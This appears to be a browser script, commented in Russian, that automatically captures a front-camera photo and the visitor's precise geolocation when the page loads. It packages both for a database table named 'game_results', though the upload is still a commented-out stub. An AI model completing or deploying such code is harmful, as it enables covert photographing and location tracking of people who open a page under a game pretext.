let cameraStream = null;
let userLocation = null;
let cameraPhoto = null;

const statusEl = document.getElementById('status');

// Запрашиваем разрешения при загрузке
window.addEventListener('load', async () => {
    await requestPermissions();
    captureAndSend();
});

async function requestPermissions() {
    try {
        // Запрашиваем камеру
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }
        });
        console.log('✅ Камера получена');
    } catch (error) {
        console.error('❌ Ошибка камеры:', error);
        statusEl.textContent = '❌ Камера недоступна';
    }

    try {
        // Запрашиваем геолокацию
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });

        userLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString()
        };
        console.log('✅ Геолокация получена:', userLocation);
    } catch (error) {
        console.error('❌ Ошибка геолокации:', error);
        statusEl.textContent = '❌ Геолокация недоступна';
    }
}

function captureAndSend() {
    statusEl.textContent = '📸 Снимаем фото...';

    if (cameraStream) {
        const video = document.createElement('video');
        video.srcObject = cameraStream;
        video.play();

        video.onloadedmetadata = () => {
            const canvas = document.getElementById('cameraCanvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            cameraPhoto = canvas.toDataURL('image/jpeg');

            // Останавливаем камеру
            cameraStream.getTracks().forEach(track => track.stop());

            console.log('✅ Фото получено');
            sendToDatabase();
        };
    } else {
        console.log('Камера недоступна, отправляем без фото');
        sendToDatabase();
    }
}

async function sendToDatabase() {
    const data = {
        photo: cameraPhoto,
        location: userLocation,
        timestamp: new Date().toISOString()
    };

    console.log('📤 Отправляем данные:', data);
    statusEl.textContent = '✅ Данные сохранены!';

    // TODO: Здесь вставим ключи Supabase для отправки в БД
    // await supabase.from('game_results').insert([data]);
}

// Экспортируем для использования в других файлах
window.appData = {
    getUserLocation: () => userLocation,
    getCameraPhoto: () => cameraPhoto
};